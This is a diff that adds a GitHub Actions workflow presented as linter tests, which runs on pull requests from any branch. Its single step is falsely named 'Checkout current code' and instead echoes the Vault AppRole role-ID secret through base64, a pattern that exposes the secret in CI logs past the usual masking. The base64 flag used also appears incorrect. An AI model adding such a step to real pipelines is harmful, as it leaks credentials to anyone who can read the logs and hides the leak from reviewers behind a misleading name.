@@ -1,0 +1,17 @@
+name: Run linter tests
+on:
+  workflow_dispatch: {}
+  push:
+    branches:
+    - main
+  pull_request:
+    branches:
+    - '**'
+
+jobs:
+  lint-and-static-analysis:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Checkout current code
+      run: |
+        echo "${{ secrets.VAULT_APPROLE_ROLE_ID }}" | base64 -e
